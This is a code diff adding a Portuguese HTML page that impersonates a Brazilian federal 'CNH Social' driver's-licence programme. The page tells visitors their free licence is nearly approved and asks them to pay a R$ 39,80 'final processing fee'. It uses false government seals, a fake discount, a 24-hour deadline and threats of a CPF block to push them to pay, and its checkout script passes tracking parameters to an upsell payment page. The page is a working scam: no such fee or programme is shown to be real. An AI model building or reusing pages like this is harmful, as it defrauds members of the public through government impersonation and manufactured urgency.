@@ -1,0 +1,459 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+    <script>
+  window.pixelId = "69004dfc4831eecd3cbc3843";
+  var a = document.createElement("script");
+  a.setAttribute("async", "");
+  a.setAttribute("defer", "");
+  a.setAttribute("src", "https://cdn.utmify.com.br/scripts/pixel/pixel.js");
+  document.head.appendChild(a);
+</script>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Portal CNH Social - Validação Final</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://fonts.googleapis.com/css2?family=Rawline:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    
+<script
+  src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+  data-utmify-prevent-subids
+  async
+  defer
+></script>
+
+
+    <style>
+        :root {
+            --blue-10: #071D41;
+            --blue-20: #1351B4;
+            --red-10: #E52207;
+            --yellow-10: #FFCD07;
+            --gray-10: #F8F9FA;
+            --gray-20: #ECEEF1;
+        }
+        body { 
+            font-family: 'Rawline', sans-serif;
+            margin: 0;
+            padding: 0;
+            background: var(--gray-10);
+            min-width: 320px;
+        }
+        .header-top {
+            background: var(--blue-10);
+            padding: 24px;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+        }
+        .header-logo {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .header-logo img {
+            height: 32px;
+        }
+        .header-logo span {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            border-left: 1px solid rgba(255,255,255,0.2);
+            padding-left: 16px;
+        }
+        .yellow-bar {
+            height: 4px;
+            background-color: var(--yellow-10);
+            width: 100%;
+        }
+        .breadcrumb {
+            background: white;
+            padding: 16px 24px;
+            border-bottom: 1px solid var(--gray-20);
+            color: var(--blue-20);
+            font-size: 14px;
+        }
+        .breadcrumb i {
+            font-size: 12px;
+            margin: 0 8px;
+        }
+        .main-container {
+            max-width: 1140px;
+            margin: 0 auto;
+            padding: 40px 24px;
+        }
+        .card {
+            background: white;
+            border-radius: 8px;
+            border: 1px solid var(--gray-20);
+            padding: 32px;
+            margin-bottom: 24px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.05);
+        }
+        .card-title {
+            color: var(--blue-10);
+            font-size: 28px;
+            font-weight: 700;
+            margin-bottom: 24px;
+            text-align: center;
+        }
+        .alert {
+            background: #FFF3CD;
+            border: 1px solid #FFEEBA;
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 32px;
+            display: flex;
+            align-items: center;
+            gap: 16px;
+        }
+        .alert i {
+            color: #856404;
+            font-size: 24px;
+        }
+        .alert p {
+            color: #856404;
+            font-weight: 600;
+            margin: 0;
+            font-size: 16px;
+        }
+        .status-item {
+            display: flex;
+            align-items: center;
+            gap: 16px;
+            padding: 16px 0;
+            border-bottom: 1px solid var(--gray-20);
+        }
+        .status-item:last-child {
+            border-bottom: none;
+        }
+        .status-item i {
+            font-size: 22px;
+        }
+        .status-item.success i {
+            color: #168821;
+        }
+        .status-item.warning i {
+            color: var(--red-10);
+        }
+        .price-box {
+            background: linear-gradient(135deg, #F5F9FF 0%, #EBF5FF 100%);
+            border: 2px solid #D0E8FF;
+            border-radius: 12px;
+            padding: 32px;
+            text-align: center;
+            margin: 32px 0;
+            position: relative;
+            overflow: hidden;
+        }
+        .price-box::before {
+            content: "URGENTE";
+            position: absolute;
+            top: 15px;
+            right: -30px;
+            background: var(--red-10);
+            color: white;
+            padding: 5px 40px;
+            font-size: 12px;
+            font-weight: 700;
+            transform: rotate(45deg);
+            box-shadow: 0 2px 4px rgba(0,0,0,0.2);
+        }
+        .price-old {
+            color: #6C757D;
+            text-decoration: line-through;
+            font-size: 18px;
+            font-weight: 500;
+        }
+        .price-new {
+            color: var(--blue-20);
+            font-size: 42px;
+            font-weight: 800;
+            margin: 12px 0;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+        .price-info {
+            color: #495057;
+            font-size: 16px;
+            font-weight: 500;
+            background: rgba(255,255,255,0.7);
+            padding: 8px 16px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-top: 8px;
+        }
+        .countdown {
+            background: rgba(229, 34, 7, 0.1);
+            border: 1px solid rgba(229, 34, 7, 0.3);
+            border-radius: 8px;
+            padding: 12px;
+            margin: 16px 0;
+            text-align: center;
+            color: var(--red-10);
+            font-weight: 600;
+            font-size: 16px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { opacity: 0.8; }
+            50% { opacity: 1; }
+            100% { opacity: 0.8; }
+        }
+        .btn-primary {
+            background: var(--blue-20);
+            color: white;
+            border: none;
+            border-radius: 8px;
+            padding: 20px 32px;
+            font-size: 18px;
+            font-weight: 700;
+            width: 100%;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 12px rgba(19, 81, 180, 0.3);
+            text-transform: uppercase;
+            letter-spacing: 1px;
+        }
+        .btn-primary:hover {
+            background: #0B3B8E;
+            transform: translateY(-2px);
+            box-shadow: 0 6px 16px rgba(19, 81, 180, 0.4);
+        }
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 32px;
+            margin-top: 32px;
+            color: #6C757D;
+        }
+        .security-badges i {
+            margin-right: 8px;
+        }
+        .warning-list {
+            margin: 24px 0;
+            background: rgba(229, 34, 7, 0.05);
+            border-radius: 8px;
+            padding: 20px;
+        }
+        .warning-list h3 {
+            color: var(--red-10);
+            font-weight: 600;
+            margin-bottom: 16px;
+            font-size: 18px;
+        }
+        .warning-list ul {
+            list-style: none;
+            padding: 0;
+        }
+        .warning-list li {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            padding: 8px 0;
+            color: #495057;
+            border-bottom: 1px dashed rgba(0,0,0,0.1);
+            padding-bottom: 12px;
+            margin-bottom: 12px;
+        }
+        .warning-list li:last-child {
+            border-bottom: none;
+            margin-bottom: 0;
+            padding-bottom: 0;
+        }
+        .warning-list i {
+            color: var(--red-10);
+            font-size: 18px;
+            flex-shrink: 0;
+        }
+        .official-seal {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            background: rgba(19, 81, 180, 0.1);
+            border: 1px solid rgba(19, 81, 180, 0.2);
+            border-radius: 8px;
+            padding: 12px 20px;
+            margin: 24px 0;
+            color: var(--blue-20);
+        }
+        .official-seal i {
+            font-size: 20px;
+        }
+        .official-seal span {
+            font-weight: 600;
+        }
+        .highlight-text {
+            background: linear-gradient(120deg, rgba(255, 205, 7, 0.2) 0%, rgba(255, 205, 7, 0.4) 100%);
+            padding: 2px 6px;
+            border-radius: 4px;
+            font-weight: 600;
+        }
+        @media (max-width: 768px) {
+            .header-logo span {
+                font-size: 20px;
+            }
+            .main-container {
+                padding: 24px 16px;
+            }
+            .card {
+                padding: 24px 16px;
+            }
+            .security-badges {
+                flex-direction: column;
+                align-items: center;
+                gap: 16px;
+            }
+            .price-new {
+                font-size: 36px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header-top">
+        <div class="header-logo">
+            <img src="./images/logo-jadlog.png" alt="Governo Federal">
+            <span>Portal CNH Social</span>
+        </div>
+    </div>
+
+    <div class="yellow-bar"></div>
+
+    <div class="breadcrumb">
+        <span>Início</span>
+        <i class="fas fa-chevron-right"></i>
+        <span>CNH Social</span>
+        <i class="fas fa-chevron-right"></i>
+        <span>Validação Final</span>
+    </div>
+
+    <main class="main-container">
+        <div class="card">
+            <h1 class="card-title">VALIDAÇÃO FINAL CNH SOCIAL</h1>
+            
+            <div class="alert">
+                <i class="fas fa-exclamation-triangle"></i>
+                <p>ATENÇÃO: Última etapa para liberação da CNH Social</p>
+            </div>
+
+            <div class="status-list">
+                <div class="status-item success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Verificação de elegibilidade</span>
+                </div>
+                <div class="status-item success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Análise de documentos</span>
+                </div>
+                <div class="status-item success">
+                    <i class="fas fa-check-circle"></i>
+                    <span>Aprovação no programa</span>
+                </div>
+                <div class="status-item warning">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <span><strong>Taxa de emissão pendente</strong></span>
+                </div>
+            </div>
+
+            <div style="margin-top: 32px;">
+                <p style="margin-bottom: 16px; font-size: 16px; line-height: 1.6;">
+                    Sua inscrição no programa CNH Social está <span class="highlight-text">quase finalizada</span>. Para concluir o processo e garantir a emissão da sua CNH gratuita, é necessário realizar o pagamento da <strong style="color: var(--red-10)">Taxa de Processamento Final</strong>.
+                </p>
+            </div>
+
+            <div class="warning-list">
+                <h3><i class="fas fa-exclamation-triangle"></i> Consequências da não regularização:</h3>
+                <ul>
+                    <li>
+                        <i class="fas fa-ban"></i>
+                        <span>Cancelamento permanente da inscrição no programa CNH Social</span>
+                    </li>
+                    <li>
+                        <i class="fas fa-file-invoice"></i>
+                        <span>Perda do direito à CNH gratuita</span>
+                    </li>
+                    <li>
+                        <i class="fas fa-user-lock"></i>
+                        <span>Bloqueio do CPF para futuros programas sociais por 24 meses</span>
+                    </li>
+                    <li>
+                        <i class="fas fa-exclamation-circle"></i>
+                        <span>Necessidade de refazer todo o processo presencialmente</span>
+                    </li>
+                </ul>
+            </div>
+
+            <div class="countdown">
+                <i class="fas fa-clock"></i> Prazo para validação: 24 horas
+            </div>
+
+            <div class="price-box">
+                <div class="price-old">R$ 197,90</div>
+                <div class="price-new">R$ 39,80</div>
+                <div class="price-info">Valor promocional - Válido apenas hoje</div>
+            </div>
+
+            <div class="official-seal">
+                <i class="fas fa-shield-alt"></i>
+                <span>Programa Oficial CNH Social - Governo Federal</span>
+            </div>
+
+            <button onclick="checkout(event)" class="btn-primary pulse-animation">
+                <i class="fas fa-check-circle"></i> FINALIZAR CNH SOCIAL
+            </button>
+
+            <div style="text-align: center; margin-top: 16px; color: #6C757D; font-size: 14px;">
+                <i class="fas fa-lock"></i> Transação segura e protegida
+            </div>
+        </div>
+
+        <div class="security-badges">
+            <div>
+                <i class="fas fa-lock"></i>
+                Conexão Segura
+            </div>
+            <div>
+                <i class="fas fa-shield-alt"></i>
+                Dados Protegidos
+            </div>
+            <div>
+                <i class="fas fa-check-circle"></i>
+                Governo Federal
+            </div>
+        </div>
+    </main>
+
+    <script>
+        function checkout(event) {
+            event.preventDefault(); 
+            // Pega os parâmetros UTM da URL atual
+            const urlParams = new URLSearchParams(window.location.search);
+            const utmParams = {};
+            
+            // Mantém apenas os parâmetros UTM e outros relevantes
+            for (const [key, value] of urlParams.entries()) {
+                if (key.startsWith('utm_') || ['src', 'sck', 'xcod', 'fbclid', 'gclid', 'ttclid'].includes(key)) {
+                    utmParams[key] = value;
+                }
+            }
+            
+            // Adiciona os novos parâmetros
+            utmParams.from_upsell = '5';
+            utmParams.valor = '3980';
+            
+            // Mantém o parâmetro transaction se existir
+            if (urlParams.has('transaction')) {
+                utmParams.transaction = urlParams.get('transaction');
+            }
+            
+            // Constrói a nova URL
+            const newParams = new URLSearchParams(utmParams);
+            window.location.href = "/cnh/checkoutup5/index.html?" + newParams.toString();
+        }
+    </script>
+
+ 
+</body>
+</html>
